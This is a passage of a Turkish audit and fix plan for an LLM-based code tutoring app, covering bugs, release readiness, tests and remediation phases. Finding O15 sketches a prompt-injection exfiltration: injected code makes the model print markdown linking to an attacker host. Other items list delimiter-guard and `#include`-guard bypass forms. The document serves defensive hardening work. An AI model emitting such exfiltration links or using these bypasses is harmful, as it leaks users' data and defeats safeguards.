  `report_callback_exception` log + kullanıcıya bildirim.
- **Test:** bozuk DB yolu ile `launch.main` → çökmeden hata akışı.

### O11 — Kök `--help` Türkçe karakterleri bozuk basıyor 🟡 🔬 ✅ Faz C

- **Dosya:** `src/codementor/cli/main.py:30-37`
- **Ne yanlış:** `ensure_utf8_console()` yalnız alt komut callback'inde çalışıyor; Windows'ta
  `codementor --help` `�` basıyor, alt komut yardımları düzgün.
- **Düzeltme:** modül yüklenirken ya da `app()` çağrısından önce çalıştır.

### O12 — Diğer CLI komutları traceback veriyor 🟡 🔬 ✅ Faz C

- **Dosyalar:** `cli/toolchain.py:39, 68`, `cli/eval.py:212`
- **Ne yanlış:** `toolchain status/install` bozuk toml'da ham traceback (exit 1). `eval compare`
  olmayan ya da bozuk dosyada `FileNotFoundError`/`ValidationError` traceback'i (exit 1). Diğer
  komutlar 3 dönüyor; tutarsız.
- **Düzeltme:** ortak bir hata sarmalayıcı (Türkçe mesaj, çıkış 3).

### O13 — Masaüstünde dışa aktarma hatası sessiz 🟡 📖 ✅ Faz F

- **Dosya:** `src/codementor/desktop/app.py:320-333`
- **Ne yanlış:** `write_text` için `OSError` yakalanmıyor; kilitli/izinsiz konumda kullanıcı hiçbir
  şey görmüyor.
- **Düzeltme:** yakala, toast/hata diyaloğu göster.

### O14 — "Geçmişi temizle" gizlilik açısından eksik 🟡 📖 ✅ Faz F

- **Dosyalar:** `storage/cache.py:161-166`, `storage/sessions.py:103`
- **Ne yanlış:**
  - Silmeden sonra `VACUUM` ya da `PRAGMA secure_delete` yok. Silinen `report_json` (kanıt
    satırlarında öğrenci kodu var) SQLite'ın boş sayfalarında okunabilir kalıyor.
  - Son dosyalar listesi (`desktop.json`) ve `desktop.log` temizlenmiyor.
- **Düzeltme:** `clear_analyses` sonrası `VACUUM`; `secure_delete=ON`; temizlik son dosyaları da
  kapsasın (logu temizlemek isteğe bağlı).

### O15 — Monaco hover güvenilmeyen markdown işliyor 🟡 📖 ✅ Faz E

- **Dosya:** `web/src/lib/markers.ts:31` (`hoverMessage: { value }`), `:57` (`f.description`),
  `:63` (`d.message`)
- **Ne yanlış:** LLM bulgu açıklamaları (kullanıcı koduyla yönlendirilebilir) ve derleyici iletileri
  (kullanıcı kodundan alıntı) kaçışsız `IMarkdownString` olarak veriliyor. Monaco 0.57'de
  `isTrusted=false` iken `command:` kapalı ve HTML kaçışlanıyor, ama http/https/mailto
  bağlantılarına ve http(s)/data görsellerine izin var.
- **Senaryo:** koda gömülü bir talimat modele `![](https://saldirgan/?q=...)` ya da
  `[ipucu](https://phish)` yazdırıyor; hover açılınca dış istek gidiyor ya da tıklanabilir bağlantı
  çıkıyor. Sızıntı korumasının kod desenleri bunu yakalamıyor. Tarayıcıda denenmedi.
- **Düzeltme:** markdown özel karakterlerini kaçışla (`\ * [ ] ( ) ! < \``) ya da açıklamayı düz
  metin ver.
- **Test:** `![x](http://e)` içeren açıklama düz metin kalıyor.

### O16 — CSP ve güvenlik başlıkları yok 🟡 📖 ✅ Faz E

- **Dosyalar:** `web/index.html`, API ara katmanı
- **Düzeltme:** web için CSP (`default-src 'self'; img-src 'self' data:; worker-src blob: 'self';
  connect-src 'self' http://127.0.0.1:8000`) — O15'teki dış görseli de kapatır. API'de
  `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`.

### O17 — CI ve release süreci 🟡 📖 ✅ Faz D

- **Dosya:** `.github/workflows/ci.yml`
- **Eksikler:**
  - Etiket (`v*`) tetikli release işi yok. Artefakt 14 gün sonra siliniyor, README ise indirmeyi
    Releases'tan anlatıyor; release elle yapılıyor ve tekrarlanamaz.
  - `permissions: contents: read` yok.
  - Action'lar SHA'ya sabitlenmemiş.
  - Exe artefaktında duman testi yok (açılış ya da `_internal` içinde `data/`, `prompts/`,
    `queries/` varlık kontrolü).
  - `concurrency` yok (aynı dalda üst üste koşular).
  - Release'te `SHA256SUMS` yok.
  - Dependabot / Renovate yok.
- **Düzeltme:** `release.yml` (etiket → exe derle → duman testi → Releases'a zip + SHA256SUMS);
  `permissions`, `concurrency`, action SHA'ları; `dependabot.yml` (pip, npm, actions).

### O18 — Sürüm tutarsızlığı 🟡 ✅ ✅ Faz D

- **Ne yanlış:**
  - `v0.1.0` etiketi `2cea9d5`'te; main bir commit ileride (`d42515c`, CLI dil düzeltmesi). Release
    zip'i bu düzeltmeyi içermiyor.
  - Sürüm iki yerde: `pyproject.toml:3` ve `src/codementor/__init__.py:3`. Eşitliklerini sınayan
    test yok.
- **Düzeltme:** tek kaynak (`importlib.metadata.version("codementor")` ya da hatch dinamik sürüm);
  güvenlik düzeltmelerinden sonra **0.1.1** etiketi ve yeni release.

---

## 5. Düşük

| Kimlik | Dosya | Bulgu | Düzeltme |
|---|---|---|---|
| D1 ✅ G3 | `prompts/v1/repair.user.j2:1-4`, `prompts/templates.py:28` | Hatalar `<validation_errors>` içine konuyor ama `guard_delimiters` bu etiketi nötrlemiyor; Pydantic `extra_forbidden` `loc`'u modelin uydurduğu anahtar adını taşır. Karmaşıklık onarımında da "şemaya uymadı" deniyor (yanıltıcı). | Etiketi guard listesine ekle; onarım nedenine göre metin. |
| D2 ✅ G3 | `verify/schema_check.py:26-40` | `extract_json` düz yazıdaki tek bir `"` karakterinden sonra JSON'u bulamıyor (`Model "notu: {"a": 1}` → `None`, ajan doğruladı). | Tırnak durumunu yalnız `{` içinde izle. |
| D3 ✅ G3 | `providers/codex_cli.py:78` | `_events` yalnız `ValueError` yakalıyor; derin iç içe JSON'da `RecursionError` sızar. `agy_stream` ve `_http` ikisini de yakalıyor. | `RecursionError` ekle. |
| D4 ✅ G3 | `providers/codex_cli.py:59-60` | `_LIMIT_HINTS`'teki çıplak `"429"` ve `_LOGIN_HINTS`'teki `"401"` her alt dizgeyle eşleşir ("line 429"). | Kelime sınırlı regex. |
| D5 ✅ G3 | `verify/proof.py:110, 133` | `apply_verdicts` bulguları yeniden numaralıyor ama `FindingCheck.finding_id` eski kimliği tutuyor. | Yeni kimliği yaz. |
| D6 ✅ G3 | `pipeline/llm_session.py`, `pipeline/cost.py` (`passes.py:79`) | Geçişler farklı sağlayıcılara düşerse `meta.provider/model` son çağrının; tüm tokenler o fiyatla hesaplanıyor. | Geçiş başına sağlayıcı/maliyet. |
| D7 ✅ G3 | `pipeline/passes.py` (`run_pass_b`), `prompts/v1/socratic.user.j2` | Sızıntıdan sonra yeniden üretim aynı prompt + aynı ayarla; sıcaklığı sabit sağlayıcıda (claude_cli) büyük olasılıkla aynı sızıntı. | İçerik sızdırmayan "daha soyut sor" notu ekle. |
| D8 ✅ G3 | `prompts/builder.py:64-72`, `orchestrator.py:161` | `FewShotError`, Jinja hataları, `FileNotFoundError` yakalanmıyor; bozuk few-shot YAML'ı her analizi 500 ile düşürüyor. | Yakalayıp `degraded` dön. |
| D9 ✅ G3 | `providers/anthropic.py:40`, `orchestrator.py:261`, `prompts/budget.py:27` | Ölü/tekrar kod: `DEFAULT_MAX_TOKENS` tekrarı, gereksiz `isinstance`, kullanılmayan `built` dönüşleri; üretimde `TEST_PROVIDERS={"fake"}` test kancası. | Temizle. |
| D10 ✅ G3 | `models/schemas.py:26-38` | `LLMMarkupAnalysisOutput` `SCHEMA_MODELS`'te yok; HTML/CSS LLM şeması `schemas/` altına yazılmıyor. | Ekle, `schemas/` yeniden üret. |
| D11 ✅ G3 | `prompts/builder.py`, `orchestrator.py` | Olay döngüsünde küçük bloklayan G/Ç: `prompt_version` her analizde `rglob`+`stat`; `_rules_version` veri dosyalarını 2 kez okuyor; `_question_bank` her istekte disk (CLI). | Önbellekle. |
| D12 ✅ G3 | `providers/cli_agent.py:108-126` | `_json_document` karesel (160 KB'de 2,7 sn; 64 KB sınırıyla ≤0,5 sn). O5'te sınır büyütülürse sorun olur. | Doğrusal tarama. |
| D13 ✅ A2 | `prompts/templates.py:36-55` | Sınırlayıcı korumasında atlanan benzer karakterler: `˂` (U+02C2), `❮` (U+276E), `❰` (U+2770), `﹤` varyantı, `«` (U+00AB), düz `&lt;/user_code&gt;`. | `_CONFUSABLES`'a ekle, `&lt;` biçimini desene kat. |
| D14 ✅ E (+G4 sertleştirme) | `api/auth.py:105`, `providers/health.py:105-133` | API anahtarı tanımlıyken bile `/health/ready`, `/docs`, `/openapi.json` açık; sağlayıcı/model adları, anahtar değişken adları, çalıştırılabilir yolları sızıyor. | Anahtar varken `/health/ready`'yi koru; `/health` açık kalsın. |
| D15 ✅ E | `report/markdown.py:14, 24, 61, 80-83` | LLM metni ve derleyici iletisi ham yazılıyor (yalnız `\|` kaçışlı); dosyada `<details>` HTML'i de var. HTML'e izin veren görüntüleyicide XSS. | `< > &` kaçışı. |
| D16 ✅ G (belge notu) | `models/request.py:36`, `storage/sessions.py:146` | `session_id` sahipsiz; kimliği bilen başkasının ipucu merdivenini ilerletir. Rastgele kimliklerle `sessions` tablosu büyütülebilir (bilinen). | `docs/mimari.md` §12'ye tehdit satırı olarak yazıldı (Faz G; kod değişmedi): `session_id` yetki sırrı değil, yerel tek kullanıcı varsayımı. Kimliği anahtara bağlama Sonraya. |
| D17 ✅ E | `web/src/lib/download.ts:10` | `revokeObjectURL` `click()`'ten hemen sonra; bazı tarayıcılarda indirme iptal olabilir (doğrulanmadı). | `setTimeout(..., 0)`. |
| D18 ✅ G4 | `validation/tier0_isolation.py:102` | Durdurma tanısı metinle tanınıyor (`startswith("Kodun sözdizimi")`); metin değişirse sessizce bozulur. | Yapısal bayrak. |
| D19 ✅ F | `desktop/app.py:396`, `storage/db.py` | `delete_history` analiz sürerken engellenmiyor (`clear_history` engelliyor). Veritabanında WAL, `busy_timeout`, şema sürümü (`user_version`) yok. DB dosyası POSIX'te 0600 oluşturulmuyor (doğrulanmadı). | Engelle; WAL + `busy_timeout`; `user_version` ile göç. |
| D20 ✅ C+F+G5 | çeşitli | ~~`cli/rules.py:20-25` `rules list` `[rules] disabled`'ı uygulamıyor~~ (**Faz C:** "Durum" sütunu kapalı/açık; `tests/unit/test_config_cli_faz_c.py::test_rules_list_marks_disabled`) ve ~~kapanışta süren analiz/indirme için onay yok~~ (**Faz F/F7:** `desktop/runtime.py::confirm_close`; `tests/desktop/test_app.py::test_close_while_busy_confirm`, `::test_close_while_downloading_confirm`). Bu bulgu satırı **2026-10-16 kapanış denetiminde** bayat çıktı; kalan maddeler zaten kapalı: `eval run --language` ✅, `buildinfo` maskeli logger ✅, exe'den `uvicorn` çıkarıldı ✅ (G5); `pyproject` `authors`/`urls`/`classifiers`/`keywords` ✅ (Faz D). Kabul edilen: `--help` İngilizce ipucu (Typer içinden geliyor), `fastapi`/`starlette` exe'den çıkarılamadı, `[desktop]` extra yapılmadı (kullanıcı kararı). | Tek tek. |

**400 satır sınırı (AGENTS.md):** 400'ü aşan dosya kalmadı. `desktop/app.py` 395 (F0'da bölündü),
`pipeline/orchestrator.py` **379** (Faz G kapanışı; G0'da 393'e inmiş, G6/G7 eklemeleriyle 421'e
çıkmıştı → `pipeline/run_state.py`), `providers/cli_agent.py` **345** (Faz G kapanışı/G8; 420 idi →
`providers/cli_result.py`), `pipeline/passes.py` 366. Sınıra yakın: `analysis/extractor.py` 398,
`desktop/views/analyze_view.py` 393, `analysis/complexity_hint.py` 386, `desktop/viewmodel.py` 383,
`desktop/connections.py` 366.

---

## 6. Public yayın hazırlığı

| # | Konu | Durum | Yapılacak |
|---|---|---|---|
| P1 | Git geçmişinde gerçek anahtar | ✅ Yok (yalnız `sk-ant-test-SECRET-…` test sahtesi) | — |
| P2 | `.env`, `private/` | ✅ `.gitignore`'da | — |
| P3 | `linkedin metini.md` | ✅ `.gitignore`'da (Faz A2) | `.gitignore`'a ekle |
| P4 | Referans çözüm sızıntısı | ❓ Y2 — `tests/fixtures/llm_responses/unity03_reference.cs` bankada çözüm gövdesi taşıyor; karar `private/` ile karşılaştırmayı gerektiriyor | Kontrol et (kullanıcı) |
| P5 | İç çalışma belgeleri | ✅ Faz D: hepsi `docs/gelistirme-gunlugu/` altına taşındı (`DEVIR_*` ×3, `CODEX_3_4_YAPILANLAR`, `YAPILANLAR_60_62_ANTIGRAVITY`, `FAZ36_OLCUM_DURUMU`, `EVAL_PARCA_REHBERI`); kökte kalmadı (2026-10-17 doğrulandı) | — |
| P6 | `PROGRESS.md` | ✅ Faz D: arşivlendi (`docs/gelistirme-gunlugu/PROGRESS-faz-0-63.md`, 224 KB); kökteki özet 2026-10-17'de 146 KB (142,6 KiB) | — |
| P7 | README doğruluğu | ✅ Faz D + 2026-10-17 tazeleme, 2026-10-18 düzeltmesi: faz anlatımı "Faz 0-63, ardından public öncesi A-H, J ve K"; test 3.700+, ADR 30, satır sayıları ölçümle eşitlendi ve teste bağlandı (`test_release_readiness.py`, 2026-10-18) | — |
| P8 | İngilizce README | ✅ Faz D: `README.en.md` var (ne, neden, hızlı başlangıç, sonuçlar) | — |
| P9 | `CONTRIBUTING.md`, `SECURITY.md`, `CHANGELOG.md`, issue/PR şablonları | ✅ Faz D: dördü de var; şablonlar `.github/ISSUE_TEMPLATE/{hata,oneri}.yml` + `PULL_REQUEST_TEMPLATE.md`; `dependabot.yml` eklendi | — |
| P10 | Release | ⚠️ Kısmi: `release.yml` hazır ve `v0.1.1` etiketi yerelde var; GitHub Release + zip yüklemesi kullanıcıda | Etiket/release (kullanıcı) |
| P11 | Yerel `dist/` | ✅ Faz D: güncel sürüm derlendi — `dist/CodeMentor.exe` (13 Eki, 41,5 MB), onedir `dist/CodeMentor/`, `dist/CodeMentor-0.1.1-win64.zip` (16 Eki, 41,2 MB); eski `dist/codementor.toml` yok | — |
| P12 | `.agents/`, `.claude/` | ✅ Bilinçli karar: repoda kalıyor (geliştirme sürecini gösteriyor) | — |
| P13 | GitHub repo ayarları | ℹ️ Açık: açıklama ve konular dolu; secret scanning + push protection + Dependabot alerts açılmadı | GitHub ayarlarından aç (kullanıcı) |

---

## 7. Sağlam bulunanlar

Denetçilerin doğruladığı, düzeltme gerektirmeyen noktalar:

- **CSRF:** `text/plain` ya da içerik türsüz POST 422; sağlayıcı çağrılmıyor (FastAPI 0.142). Not:
  FastAPI varsayılanına dayanıyor → regresyon testi önerilir (§8).
- **Host denetimi:** `localhost.evil.com`, `localhost.` 400 (DNS rebinding koruması çalışıyor).
- **API anahtarı:** `hmac.compare_digest` ile sabit zamanlı.
- **Yol geçişi:** soru ve analiz kimlikleri ULID / sözlük aramasıyla sınırlı; `delete_source`
  `isalnum()` korumalı.
- **SQL:** tamamen ORM ve parametreli.
- **Hata yanıtları:** 422 girdiyi yansıtmıyor; 500 ve SSE hatalarında yalnız istisna türü loglanıyor.
- **Prompt:** `<user_code>` builder içinde guard'dan geçiyor; referans çözüm prompt'a girmiyor;
  sızıntı kontrolü gerekçe adımlarına ve bulgu açıklamalarına da uygulanıyor.
- **Web XSS:** `dangerouslySetInnerHTML` / `innerHTML` yok.
- **Şemalar:** `schemas/*.json` Pydantic modelleriyle birebir (betikle karşılaştırıldı).
- **Kural 5:** kodda gömülü model adı / URL yok.
- **Toolchain indirme:** sha256 hem akışta hem diskten doğrulanıyor; her yönlendirmede https
  zorunlu; boyut/dosya sayısı tavanlı; `safe_extract` symlink, `..`, aygıt adı, çakışma redleri
  sağlam.
- **Alt süreç ortamı:** izin listeli (`sanitized_env`); API anahtarları geçmiyor; gcc/clang stderr'i
  loglanmıyor; Roslyn stderr'i `scrub`'lı.
- **Masaüstü iş parçacığı güvenliği:** arka plan iş parçacığından widget'a dokunan yer bulunmadı;
  köprü kuşak ve iptal mantığı doğru.
- **`build_exe.py` DATA listesi:** çalışma anında okunan tüm veri dosyalarını kapsıyor.
- **Karmaşıklık ipucu:** ikili arama → `log n`, iç içe döngü → `n^2`, `i*=2` → `log n`, sabit döngü
  → `1` doğru. `i*i<=n` O(√n) yerine `n`/low (muhafazakâr, kabul edilebilir).
- **Geniş `except`'ler:** hepsi gerekçeli ve loglanıyor; sessiz yutma yok.

---

## 8. Eksik testler

**Güvenlik**
1. `include_guard`: `#/**/include`, `%:/**/include`, `#/*\n*/include` red fixture'ları (K1).
2. `compiler` işaretli uçtan uca: atlatma girdisi Tier 1'e ulaşmıyor (K1).
3. Tüm `detect` / `rules` / `analysis` regex'leri için en kötü durum + süre bütçesi (K2).
4. Araç keşfinde çalışma dizini sahte derleyici reddi (Y1).
5. Dosya varlığı kahini: var/yok ayrımı kullanıcıya sızmıyor (K1).
6. `guard_delimiters`: U+02C2, U+276E, `&lt;/user_code` (D13).
7. `text/plain` CSRF regresyonu (FastAPI sürümü değişirse sessizce açılmasın).
8. Anahtar tanımlıyken `/health/ready`, `/openapi.json`, `/docs` erişim politikası (D14 ✅ Faz E,
   sondaki `/` ve `%` kodlaması sertleştirmesi Faz G4).
9. Web: `markers.ts` markdown kaçışı (O15).

**LLM hattı**

10. Onarım bozuk / çelişki sürüyor → ilk geçerli bulgular korunuyor (Y3).
11. Geçiş B `ProviderError` / `PromptBudgetError` / zaman aşımı → Geçiş A korunuyor (Y4).
12. Fallback yanıtı birincil anahtarla önbellekten dönmüyor (Y5).
13. `single_pass` + kanıtsız bulgu → ayrı Geçiş B (O2).
14. Önbellek dönüşünde `cost_est is None` (O4).
15. `options.tier1` / `rules.disabled` değişince önbellek ıskalanıyor (O3).
16. Seviye < 3'te kavram adı masaüstü/API/JSON'da yok; sızıntılı kavram adı yakalanıyor (Y6).
17. 64 KB'yi aşan agy/codex akış çıktısı (O5).
18. `</validation_errors>` içeren `loc` (D1); codex'te derin iç içe JSON satırı (D3).

**Masaüstü / CLI / config**

19. `config_writer`: satır içi tablo, nokta anahtarı, BOM, atomik yazım (Y7, O7).
20. Exe'de "yaz → yeniden yükle" aynı dosyayı kullanıyor (Y8).
21. CLI çıkış kodları: DB hatası, `--out` yazılamıyor, `toolchain status` bozuk toml, `eval compare`
    olmayan dosya → hepsi 3 (Y9, O12).
22. Kodda geçen her `resource_path("…")`'in `build_exe.DATA` altında olduğunu çapraz denetleyen test;
    exe artefaktı duman testi (O17).
23. `pyproject` sürümü == `__version__` (O18).
24. `launch.main` bozuk DB; export `OSError` (O10, O13).
25. Kök `--help` UTF-8 çıktısı (O11).

---

## 9. Eklenmesi önerilen özellikler

**Web**
- Geçmiş listesi (`GET /v1/analyses` + sayfalama), tekil ve toplu silme (`DELETE /v1/analyses`),
  oturum silme (`DELETE /v1/sessions/{id}`).
- Web istemcisinden `X-API-Key` gönderme (şu an anahtar tanımlanırsa web çalışmaz; bilinen).
- Soru filtresi boşsa "eşleşen soru yok" mesajı (bilinen).
- İstemci başına hız sınırı (bilinen).
- `serve` dışa açık adrese bağlanırken anahtar yoksa başlamayı reddetmek (ya da `--insecure`).

**Masaüstü**
- Ctrl+S ile kaydetme; dosya açma / bırakma / geçmişten açmada kaydedilmemiş değişiklik uyarısı.
- Geçmişte sayfalama ve arama (şu an `list_analyses` limit=50, 2000'e kadar saklanıyor).
- Bozuk / eski veritabanı için "yedekle ve sıfırla".
- Kapanırken "analiz/indirme sürüyor, çıkılsın mı?" onayı.
- Keyring'deki tüm anahtarları ve eski OpenAI/DeepSeek kayıtlarını temizleme (bilinen).
- Linux/macOS'ta "Oturum aç" desteği (şu an yalnız Windows konsolu).
- İmzalı exe + kurulum paketi (bilinen).

**Statik kurallar (dil başına kural sayısı: C 6, Python 6, HTML 7, CSS 3, C++ 3, C# 3, Unreal 3)**
- **CSS (en zayıf):** `outline:none` + focus göstergesi yok (CSS-CL-004), sabit `px` yükseklik
  taşması (CSS-CL-006), `position:absolute` + margin hack ile ortalama (CSS-CL-007). Kontrol
  listesinde var, statik kuralı yok.
- **C++:** döngüde `std::string +` / `+=` karesel (bilinen); döngüde `std::endl` (gereksiz flush);
  `reserve` olmadan döngüde `push_back`.
- **C:** genişlik sınırı olmayan `scanf("%s")` (tampon taşması).
- **Unreal:** `TArray<AActor*>` / `TMap<…, UObject*>` kapsayıcı alanları (UE-GC-001 kaçırması, bilinen).
- **C#:** `IList`/`IReadOnlyList` tipli değişkenler (CS-PERF-001 kaçırması, bilinen); döngüde
  `string +=`.

**Daha önce planlanmış olanlar**
- Eski Faz 64-66 (`docs/GUNCELLEMELER.md`): yerel model ölçümü, küçük modeller için Sokratik kalite
  kapısı, yerel modelde hız.
- PROGRESS "Sonraya" (~60 madde).
- README yol haritası: cppcheck / clang-tidy, LLM-as-judge Sokratik kalite puanı, VS Code eklentisi,
  Rust/Go.

---

## 10. Faz planı (A-J)

**Karar (2026-10-12):** fazlar harfle numaralanır; eski Faz 64-66 Faz I'ya taşındı.

Kimlikler (K/Y/O/D/P) bu belgenin §2-§6 bölümlerine işaret eder. Yeni fazlar sayı yerine **harfle**
numaralanır; eski Faz 64-66 (yerel modeller) **Faz I**'ya taşındı. Her faz standart döngüyle
uygulanır: plan modu → onay → test → `make check` → kabul kriterleri → PROGRESS → commit önerisi
→ `kod-denetci` denetimi.

**Öncelik:** A-D repo public olmadan (2026-10-18) bitmeli. E-I public sonrası.

| Faz | Kapsam | Zaman |
|---|---|---|
| A | Güvenlik açıkları | 18 Ekim öncesi, **şart** |
| B | Bulgu kaybı ve önbellek doğruluğu | 18 Ekim öncesi |
| C | İpucu merdiveni, yapılandırma, CLI | 18 Ekim öncesi |
| D | Public belgeler ve release | 18 Ekim öncesi |
| E | Web: geçmiş, silme, güvenlik başlıkları | Sonra |
| F | Masaüstü sağlamlık ve UX | Sonra |
| G | Sağlayıcı sağlamlığı ve kod temizliği | Sonra |
| H | Statik kurallar ve analiz doğruluğu | Sonra |
| I | Yerel modeller ve eval (eski Faz 64-66) | Sonra |
| J | Açık kalan diğer işler (havuz) | İhtiyaç oldukça |
| K | Kullanıcı soruları + token kullanımı (kullanıcı isteği, C'den önce) | ✅ 2026-10-13 |

---

### Faz A — Güvenlik açıkları (öncelik: kritik)

**Dal:** `faz/a-guvenlik` · **Mimari:** §4.4, §12 · **ADR:** gerekirse 0010/0023 eki

**Amaç:** Public öncesi, kullanıcı kodunun sunucuyu kilitlemesini ve derleyici aracılığıyla host
dosya sistemine dokunmasını kesin olarak engellemek.

- [x] **K1 — Include koruması:** yönerge araması maskelenmiş metinde de yapılır; `#/**/include`,
      `%:/**/include`, satırı bölen yorumlu biçim (`#/*\n*/include`) fail-closed reddedilir
      (`validation/include_guard.py`) — **Faz A1**
- [x] **K2 — ReDoS:** `ingest/detect.py:133` deseni doğrusal hale gelir (kübik, saatler) — **Faz A1**
- [x] **K2 — Karesel desenler:** `detect.py`'deki `re.M` + `^\s*` desenleri (Java deseni dahil,
      testin yakaladığı 7.) `^[ \t]*` ve satır içi `[^…\n]` sınıflarıyla düzeltildi — **Faz A1**
- [x] **K2 — Kalan tarama:** `analysis/`, `rules/` ve `verify/` içindeki **tüm modül düzeyi
      desenler** (44 desen) en kötü girdiyle tarandı; beşi süper-doğrusaldı ve doğrusallaştırıldı
      (`call_costs._LAST_INDEX`/`_END_INDEX`, `leak_guard._ASSIGNMENT`, `leak_guard`
      yorum/metin taraması, `complexity._TRAILER`). `analysis/_recursion.py:21`,
      `verify/lines.py:20`, `verify/proof.py:50` ölçümde zaten doğrusal çıktı (bütçe içinde).
      Test: `tests/unit/test_regex_budget.py` (otomatik keşif + 40 KB bütçesi + hypothesis
      uzunluk eğrisi + eski desenle eşdeğerlik fuzz'ı) — **KALAN_ISLER.md iş 4, 2026-10-18**
- [x] **K2 — Olay döngüsü:** `Orchestrator._ingest` iş parçacığında (`asyncio.to_thread`);
      `test_offloop.py` kapsıyor — **Faz A1**. Not: süre sınırı (`analysis_timeout_s`) hâlâ yalnız
      LLM geçişlerini kapsıyor; regex doğrusal olduğu için gerekmedi
- [x] **Ek bulgu (Faz A1):** `detect.py`'de 13 desende `\b` yerine görünmez backspace (U+0008)
      vardı (Faz 16, `abfeb08`'den beri). Python `import`/`elif`/`self.`/`print(`/`None`, HTML
      `<html`/boş öğe/öznitelik, CSS `@kural`/`var(--`/birim sinyalleri **hiç eşleşmiyordu**.
      Hepsi `\b` yapıldı; CSS birimi `(?!\w)` (`100%;` de eşleşsin). Kaynakta U+0008 kalmadığını
      sınayan test eklendi
- [x] **Y1 — Araç keşfi:** çalışma dizinindeki çalıştırılabilir dosya derleyici olarak seçilmez
      (`validation/toolchain.py`); Windows'taki `NoDefaultCurrentDirectoryInExePath`
      davranışına bağlı kalınmaz. `providers/_cli_common.py` `_candidates()` mantığı ortak
      yardımcıya (`runner.find_on_path`) çıkarılıp iki yerde de kullanılır — **Faz A2**
- [ ] **Y2 — Referans çözüm:** `tests/fixtures/llm_responses/unity03_reference.cs` bankadaki
      çözümle karşılaştırılır (kullanıcı; `private/` erişimi). Aynıysa bankada olmayan yapay bir
      çözümle değiştirilir, golden'lar yeniden üretilir. **Açık (2026-10-13, kullanıcı kararı):**
      repo henüz private; **public yapılmadan önce** kullanıcı kontrol edecek
- [x] **D13 — Sınırlayıcı:** `˂` (U+02C2), `❮` (U+276E), `❰` (U+2770), `«` (U+00AB) ve
      `&lt;/user_code&gt;` biçimi `guard_delimiters`'a eklenir — **Faz A2**
- [x] **P3:** `linkedin metini.md` `.gitignore`'a eklenir — **Faz A2**
- [ ] Testler:
  - include: üç atlatma biçimi + `# /* a */ include`, `#/**//**/include` red; `compiler`
    işaretli uçtan uca test (yönerge Tier 1'e ulaşmaz)
  - ReDoS: her sinyal deseni için en kötü durum girdileri < 50 ms; hypothesis ile süre bütçesi;
    40 KB `"a:" + boşluk` girdisi analizde hızlı biter
  - araç keşfi: geçici dizinde sahte `gcc`/`gcc.bat` + `chdir` → seçilmez
  - sınırlayıcı: yeni benzer karakterler nötrlenir

**Kabul:** üç atlatma girdisi reddedilir; 40 KB kötü niyetli girdi < 1 sn; `/health` analiz
sırasında yanıt verir; `make check` yeşil.
**Commit:** `fix(faz-a): include koruması, ReDoS ve araç keşfi güvenlik açıkları`

---

### Faz B — Bulgu kaybı ve önbellek doğruluğu (öncelik: yüksek)

**Dal:** `faz/b-bulgu-kaybi-onbellek` · **Mimari:** §5.4, §8 · **ADR:** gerekirse 0019 eki

**Amaç:** LLM'in kısmi başarısızlığında doğrulanmış bulgular kaybolmasın; önbellek yalnız tam ve
doğru anahtarlı sonuç döndürsün.

- [x] **Y3 — Onarım:** onarım başarısız ve kalan hata yalnız karmaşıklıksa bulgular korunur,
      `complexity=None` + uyarı; şema hatasıyla biten onarımda son geçerli yanıt kullanılır
      (`pipeline/passes.py:122-147`)
- [x] **Y4 — Geçiş B:** `run_llm_passes` kısmi sonuç döndürür; Geçiş B'deki sağlayıcı/bütçe/süre
      hatası Geçiş A bulgularını silmez, Sokratik kısım şablona düşer (Sonraya: Faz 48 denetimi
      maddesi de kapanır)
- [x] **Y5 — Fallback önbelleği:** yanıtı fallback sağlayıcı verdiyse ya da LLM kısmen başarısızsa
      (Sokratik şablon, doğrulama hatası) rapor önbelleğe alınmaz
- [x] **O2 — `single_pass`:** kanıt kontrolü bulgu düşürünce sorular atılır, ayrı Geçiş B yapılır
      (§5.4.2)
- [x] **O3 — Önbellek imzası:** `options.tier1`, derleyici kimliği/sürümü, `rules.disabled`,
      `rules.max_findings`, prompt ayarları, `verify.*`, `max_repair_attempts` ve soru içeriği
      özeti anahtara girer (Sonraya: Faz 49 maddeleri de kapanır)
- [x] **O4 — Maliyet:** önbellekten dönen raporda `cost_est=None`, `usage_estimated=False`
- [x] Testler: §8 madde 10-15 (BulgularVeDuzeltilecekler) — **Faz B** (O3'te referans çözüm
      dosyası ve `data/checklists` içeriği hâlâ anahtarda değil)

**Kabul:** her senaryo FakeProvider testiyle; statik dev eval bulguları değişmez; `make check`
yeşil.
**Commit:** `fix(faz-b): kısmi LLM hatasında bulguları koru, önbellek imzasını tamamla`

---

### Faz C — İpucu merdiveni, yapılandırma ve CLI (öncelik: yüksek)

**Dal:** `faz/c-ipucu-yapilandirma`

**Amaç:** Kavram adı hiçbir arayüzde erken açılmasın; kullanıcının ayarı bozulmasın; CLI sistem
hatasını bulgudan ayırsın.

- [x] **Y6 — Kavram adı:** gösterim kuralı tek bayrakta (ör. `SocraticResult.concept_revealed`);
      masaüstü, web, CLI, Markdown, API JSON aynı kuralı uygular; `key_flaw_concept` sızıntı
      denetimine girer
- [x] **Y7 — toml yazıcısı:** satır içi tablo, nokta anahtarı ve yorumlar korunur; yazım atomik
- [x] **Y8 — Exe toml yolu:** toml'suz exe'de yazılan dosya `CONFIG_FILE_ENV` ile etkinleşir;
      Bağlantılar ekranı gerçek konumu gösterir
- [x] **O7 — BOM:** BOM'lu toml okunur ve yazılır
- [x] **O8 — `.env`:** karar: `.env` desteği ya da açık uyarı; `.env.example` güncel değişkenlerle
      (`ANTHROPIC_API_KEY`, `GEMINI_API_KEY`, `CODEMENTOR_API_KEY`)
- [x] **O9 — Wheel:** varsayılan toml pakete girer; kurulu masaüstü `~/.codementor/codementor.toml`
      kullanır
- [x] **Y9, O12 — CLI çıkış kodları:** sistem hataları Türkçe mesaj + çıkış 3; `--out` `with` ile
- [x] **O11 — `--help`:** kök yardım UTF-8
- [x] **D20 (kısmi):** `rules list` `[rules] disabled`'ı gösterir
- [x] Testler: §8 madde 16, 19-21, 25 — **Faz C** (O8 kararı: `.env` yüklenmez, belgelendi)

**Commit:** `fix(faz-c): ipucu merdiveni tutarlılığı, toml yazımı, CLI çıkış kodları`

---

### Faz D — Public belgeler ve release (öncelik: yüksek)

**Dal:** `faz/d-public-release`

**Amaç:** Repo public olduğunda ziyaretçi doğru, güncel ve derli toplu bir proje görsün; indirme
tekrarlanabilir bir release'ten gelsin.

- [x] **P5, P6 — Belge düzeni:** iç çalışma belgeleri (`DEVIR_*`, `CODEX_3_4_YAPILANLAR`,
